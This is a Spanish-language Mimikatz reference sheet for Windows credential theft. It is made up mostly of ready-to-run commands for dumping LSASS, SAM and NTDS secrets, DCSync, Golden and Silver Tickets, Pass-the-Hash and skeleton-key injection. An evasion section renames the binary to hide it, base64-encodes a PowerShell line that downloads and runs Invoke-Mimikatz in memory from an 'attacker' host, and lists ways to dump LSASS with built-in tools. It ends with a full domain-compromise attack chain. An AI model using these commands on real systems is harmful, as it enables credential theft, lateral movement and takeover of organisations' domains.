# 🔑 Mimikatz - Guía de referencia completa

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Herramienta de extracción de credenciales de Windows
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Credenciales">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 La herramienta más potente para extraer credenciales de Windows</b>
</p>

---

## 📋 Índice

- [Qué es Mimikatz](#-qué-es-mimikatz)
- [Primeros pasos](#-primeros-pasos)
- [Métodos de ejecución](#-métodos-de-ejecución)
- [Módulos principales](#-módulos-principales)
- [Extracción de credenciales](#-extracción-de-credenciales)
- [Ataques Kerberos](#-ataques-kerberos)
- [Ataques avanzados](#-ataques-avanzados)
- [Técnicas de evasión](#-técnicas-de-evasión)
- [Referencia rápida](#-referencia-rápida)

---

## 🎯 Qué es Mimikatz

**Mimikatz** es una herramienta de pos-explotación creada por **Benjamin Delpy** (@gentilkiwi) que permite extraer:

- 🔑 **Contraseñas en texto claro** de la memoria de Windows (LSASS)
- 🎫 **Tickets Kerberos** (TGT, TGS)
- 🔐 **Hashes NTLM** de SAM/NTDS
- 📜 **Certificados** y claves privadas
- 🗝️ **Credenciales en caché**
- 🔒 **Secretos de DPAPI**

Pass-the-Hash reutiliza un hash para autenticarse; Pass-the-Ticket reutiliza un ticket Kerberos. Golden Ticket y Silver Ticket designan tickets falsificados para el dominio y para un servicio, respectivamente.

### ¿Por qué es importante?

| Caso de uso | Descripción |
|----------|-------------|
| **Robo de credenciales** | Extraer contraseñas de la memoria |
| **Movimiento lateral** | Pass-the-Hash, Pass-the-Ticket |
| **Escalada de privilegios** | Suplantar usuarios |
| **Persistencia** | Golden/Silver Tickets |
| **Control del dominio** | DCSync para comprometer AD por completo |

---

## 🚀 Primeros pasos

### Descarga

```bash
# Repositorio oficial
git clone https://github.com/gentilkiwi/mimikatz.git

# Binarios precompilados (versiones publicadas)
# https://github.com/gentilkiwi/mimikatz/releases
```

### Requisitos

- Privilegios de **Administrator/SYSTEM** (para la mayoría de las funciones)
- **SeDebugPrivilege** (para acceder a LSASS)
- Windows x64 o x86

### Primeros comandos

> **Precisión:** `token::elevate` suplanta un token disponible; no habilita automáticamente todos los privilegios ni garantiza obtener SYSTEM.

```cmd
# Iniciar mimikatz
mimikatz.exe

# Comprobar privilegios
mimikatz # privilege::debug
Privilege '20' OK

# Habilitar todos los privilegios
mimikatz # token::elevate

# Salir
mimikatz # exit
```

---

## 💻 Métodos de ejecución

### 1. Binario independiente

```cmd
# Ejecución directa (detectada por el antivirus)
mimikatz.exe

# Comando de una línea
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Guardar la salida en un archivo
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# Con el comando log
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 2. PowerShell (Invoke-Mimikatz)

```powershell
# Descargar y ejecutar en memoria (sin archivo en disco)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Volcar credenciales
Invoke-Mimikatz -DumpCreds

# Volcar certificados
Invoke-Mimikatz -DumpCerts

# Ejecutar en un equipo remoto
Invoke-Mimikatz -ComputerName DC01
```

### 3. Metasploit (Kiwi)

```bash
# En una sesión de Meterpreter
meterpreter > load kiwi

# Obtener ayuda
meterpreter > help kiwi

# Volcar todas las credenciales
meterpreter > creds_all

# Volcar hashes
meterpreter > lsa_dump_sam

# Volcar secretos
meterpreter > lsa_dump_secrets

# Tickets Kerberos
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

### 4. CrackMapExec

```bash
# Volcar SAM
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# Volcar LSA
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# Volcar NTDS
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

### 5. Desde un volcado de memoria

```cmd
# Volcar LSASS con el Administrador de tareas o procdump
procdump.exe -ma lsass.exe lsass.dmp

# Cargar el volcado en mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## 🔧 Módulos principales

### Resumen de módulos

| Módulo | Descripción |
|--------|-------------|
| **sekurlsa** | Extraer credenciales de la memoria de LSASS |
| **lsadump** | Volcar SAM, NTDS, secretos y caché |
| **kerberos** | Manipulación de tickets Kerberos |
| **crypto** | Certificados de CryptoAPI |
| **vault** | Windows Vault (administrador de credenciales) |
| **token** | Manipulación de tokens |
| **privilege** | Manipulación de privilegios |
| **process** | Manipulación de procesos |
| **service** | Manipulación de servicios |
| **dpapi** | Secretos de DPAPI |
| **misc** | Comandos diversos |

### Obtener ayuda

```cmd
# Listar todos los módulos
mimikatz # ::

# Ayuda del módulo
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

## 🔐 Extracción de credenciales

> **Compatibilidad:** la extracción de contraseñas en texto claro depende de los proveedores de autenticación, la versión y las protecciones del sistema. Un fallo de acceso a LSASS no demuestra por sí solo que Credential Guard esté activo. [Microsoft explica su aislamiento de secretos mediante VBS](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/).

### Módulo sekurlsa (LSASS)

```cmd
# ¡Habilitar primero el privilegio de depuración!
mimikatz # privilege::debug

# Volcar todas las contraseñas de inicio de sesión (texto claro, NTLM y SHA1)
mimikatz # sekurlsa::logonpasswords

# Volcar solo los hashes NTLM
mimikatz # sekurlsa::msv

# Volcar tickets Kerberos
mimikatz # sekurlsa::tickets

# Volcar credenciales WDigest (en texto claro si está habilitado)
mimikatz # sekurlsa::wdigest

# Volcar claves de cifrado Kerberos
mimikatz # sekurlsa::ekeys

# Volcar credenciales DPAPI
mimikatz # sekurlsa::dpapi

# Volcar credenciales de un proceso concreto
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# Volcar credenciales TsPkg (RDP)
mimikatz # sekurlsa::tspkg

# Volcar credenciales LiveSSP
mimikatz # sekurlsa::livessp

# Volcar credenciales SSP
mimikatz # sekurlsa::ssp

# Volcar credenciales CloudAP (Azure AD)
mimikatz # sekurlsa::cloudap
```

### Módulo lsadump (SAM/NTDS)

> **Precisión del original:** `lsadump::lsa /patch` y `/inject` operan sobre LSA; no exportan por sí solos el archivo `NTDS.dit`. Se conservan las etiquetas del ejemplo para mantener la correspondencia. Véase el [módulo lsadump oficial](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump).

```cmd
# Volcar la base de datos SAM (cuentas locales)
mimikatz # lsadump::sam

# Volcar SAM con la sección SYSTEM del Registro
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# Volcar secretos LSA
mimikatz # lsadump::secrets

# Volcar credenciales en caché (DCC2)
mimikatz # lsadump::cache

# DCSync (replicación del controlador de dominio)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Volcar NTDS.dit (controlador de dominio)
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# Volcar claves de relaciones de confianza
mimikatz # lsadump::trust /patch

# Volcar claves de recuperación (DPAPI)
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

### Módulo vault (Administrador de credenciales)

```cmd
# Listar credenciales de Vault
mimikatz # vault::list

# Volcar credenciales de Vault
mimikatz # vault::cred /patch
```

### Módulo dpapi

```cmd
# Volcar claves maestras DPAPI
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# Descifrar un blob DPAPI
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# Contraseñas de Chrome
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## 🎫 Ataques Kerberos

### Ver tickets

```cmd
# Listar todos los tickets
mimikatz # kerberos::list

# Listar tickets con detalles
mimikatz # kerberos::list /export

# Exportar todos los tickets
mimikatz # sekurlsa::tickets /export
```

### Pass-the-Ticket (PtT)

```cmd
# Eliminar los tickets existentes
mimikatz # kerberos::purge

# Importar un ticket
mimikatz # kerberos::ptt ticket.kirbi

# Verificar el ticket
mimikatz # kerberos::list
```

### Golden Ticket (persistencia como administrador del dominio)

> **Precisión de los comentarios:** RID 500 identifica una cuenta de administrador, no un grupo; `/sids` añade SID adicionales y no selecciona el controlador de dominio. La aceptación de identidades ficticias y tickets depende de las validaciones y actualizaciones del entorno.

```cmd
# Requisitos:
# - Nombre del dominio (domain.local)
# - SID del dominio (S-1-5-21-...)
# - Hash NTLM de krbtgt
# - Nombre de usuario objetivo (puede ser ficticio)

# Crear un Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# Crear y exportar
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# Con grupos concretos (RID 500 = Admin, 512 = Domain Admins, etc.)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# Con el controlador de dominio objetivo
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

### Silver Ticket (específico de un servicio)

```cmd
# Requisitos:
# - Nombre del dominio
# - SID del dominio
# - Hash NTLM de la cuenta del servicio objetivo
# - SPN del servicio

# Crear un Silver Ticket para CIFS (recursos compartidos de archivos)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# Silver Ticket para HTTP (web)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# Silver Ticket para SQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# Silver Ticket para WinRM/PSRemoting
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

## 💀 Ataques avanzados

### Pass-the-Hash (PtH)

```cmd
# Ejecutar un comando como un usuario mediante su hash NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Con claves AES
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# PtH para iniciar un proceso
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

### Overpass-the-Hash (Pass-the-Key)

```cmd
# Convertir NTLM en un ticket Kerberos
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Después, solicitar un TGT
# klist debería mostrar un ticket Kerberos
```

### Ataque DCSync

```cmd
# Replicar un usuario
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# Replicar krbtgt (para un Golden Ticket)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Replicar todos los usuarios
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Replicar desde un controlador de dominio concreto
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

### Skeleton Key

```cmd
# Inyectar una skeleton key en LSASS del controlador de dominio (todos los usuarios pueden autenticarse con "mimikatz")
mimikatz # misc::skeleton

# Persistencia hasta que se reinicie el controlador de dominio
# Iniciar sesión con cualquier usuario: password = mimikatz
```

### Abuso de DPAPI

```cmd
# Volcar claves maestras
mimikatz # sekurlsa::dpapi

# Descifrar un archivo de credenciales
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# Contraseñas guardadas de RDP
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

### Manipulación de tokens

```cmd
# Listar tokens
mimikatz # token::list

# Elevar a SYSTEM
mimikatz # token::elevate

# Elevar a un usuario concreto
mimikatz # token::elevate /user:Administrator

# Volver al token original
mimikatz # token::revert

# Ejecutar como un usuario concreto
mimikatz # token::run /user:domain\admin
```

---

<a id="-técnicas-de-evasión"></a>
## 🛡️ Técnicas de evasión

### Nombres ofuscados

```cmd
# Renombrar mimikatz.exe
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

### Ofuscación de PowerShell

```powershell
# Codificar en Base64
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### Ejecución solo en memoria

```powershell
# Invoke-Mimikatz (sin archivo en disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# O usar Kiwi en Meterpreter
meterpreter > load kiwi
meterpreter > creds_all
```

### Alternativas para volcar LSASS

El recorrido de menú del Administrador de tareas se conserva literalmente en inglés para que pueda reconocerse en esa interfaz.

```cmd
# Procdump (firmado por Microsoft)
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll (incluido en el sistema)
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# Administrador de tareas (interfaz gráfica)
# Right-click lsass.exe > Create dump file

# SQLDumper (de SQL Server)
sqldumper.exe <lsass_pid> 0 0x01100
```

### Evasión de Credential Guard

> **Alcance:** DCSync requiere derechos de replicación del directorio y no desactiva Credential Guard ni equivale a eludir su aislamiento local. Renombrar un ejecutable o codificar PowerShell en Base64 tampoco garantiza evitar la detección.

```cmd
# Comprobar si Credential Guard está habilitado
mimikatz # sekurlsa::logonpasswords
# Mostrará "ERROR kuhl_m_sekurlsa_acquireLSA"

# Alternativa: usar DCSync
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## 📊 Referencia rápida

### Comandos esenciales de una línea

```cmd
# Volcar todas las credenciales
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Volcar SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# DCSync de todos los usuarios
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

### Referencia rápida de módulos

| Comando | Descripción |
|---------|-------------|
| `privilege::debug` | Habilitar el privilegio de depuración |
| `token::elevate` | Elevar a SYSTEM |
| `sekurlsa::logonpasswords` | Volcar todas las credenciales de LSASS |
| `sekurlsa::msv` | Volcar hashes NTLM |
| `sekurlsa::tickets` | Volcar tickets Kerberos |
| `sekurlsa::pth` | Pass-the-Hash |
| `lsadump::sam` | Volcar la base de datos SAM |
| `lsadump::secrets` | Volcar secretos LSA |
| `lsadump::dcsync` | Ataque DCSync |
| `lsadump::lsa /patch` | Volcar NTDS desde el controlador de dominio |
| `kerberos::list` | Listar tickets Kerberos |
| `kerberos::ptt` | Pass-the-Ticket |
| `kerberos::golden` | Crear un Golden/Silver Ticket |
| `kerberos::purge` | Eliminar tickets |
| `vault::list` | Listar credenciales de Vault |
| `dpapi::cred` | Descifrar credenciales DPAPI |

### Ejemplo de cadena de ataque

```
1. Obtener acceso inicial
2. privilege::debug
3. sekurlsa::logonpasswords (obtener credenciales)
4. sekurlsa::pth (movimiento lateral)
5. lsadump::dcsync /user:krbtgt (obtener el hash de krbtgt)
6. kerberos::golden (crear un Golden Ticket)
7. ¡Dominio completamente comprometido!
```

---

## 📚 Recursos

- [GitHub oficial](https://github.com/gentilkiwi/mimikatz)
- [Wiki de Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki)
- [Guía de Mimikatz de ADSecurity](https://adsecurity.org/?page_id=1821)
- [HackTricks Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

### Guías de referencia relacionadas
- [Windows PrivEsc](../../Windows-PrivEsc/translations/README.es.md)
- [Metasploit](../../Metasploit/translations/README.es.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.es.md)

---

<p align="center">
  <b>🔑 ¡Domina los ataques a credenciales de Windows!</b><br>
  <i>Mimikatz - La navaja suiza del hacker para Windows</i>
</p>
